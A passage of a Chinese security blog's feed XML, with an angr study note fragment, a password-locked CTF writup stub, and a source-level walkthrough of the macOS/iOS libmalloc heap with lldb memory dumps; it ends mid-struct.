访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-30T04:08:21.329Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - 